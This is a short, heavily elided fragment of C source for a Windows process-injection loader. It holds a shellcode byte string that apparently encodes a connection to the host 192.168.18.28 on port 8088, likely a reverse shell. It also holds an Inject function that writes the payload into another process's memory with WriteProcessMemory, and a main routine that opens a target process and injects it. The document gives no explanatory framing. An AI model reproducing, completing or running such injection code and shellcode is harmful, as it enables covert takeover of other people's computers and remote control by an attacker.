...
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x1f\x98\xc0\xa8\x12\x1c"
...
int Inject(HANDLE hProc, unsigned char *payload, unsigned int payload_len) {
    ...
    if (!WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, NULL)) {
...
int main(void) {
    ...
    if (pid) {
        ...
        if (hProc != NULL) {
            if (Inject(hProc, buf, payload_len) == 0) {
